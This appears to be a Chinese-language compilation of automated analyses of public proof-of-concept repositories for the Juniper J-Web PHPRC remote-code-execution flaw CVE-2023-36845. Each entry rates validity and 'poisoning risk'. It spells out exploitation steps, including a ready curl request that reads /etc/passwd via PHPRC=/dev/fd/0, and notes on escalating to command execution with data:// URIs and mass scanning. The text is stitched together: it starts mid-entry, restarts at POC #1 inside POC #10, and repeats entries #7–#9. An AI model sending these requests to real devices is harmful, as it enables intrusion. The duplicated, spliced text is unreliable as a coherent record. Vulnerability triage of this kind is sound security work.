3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

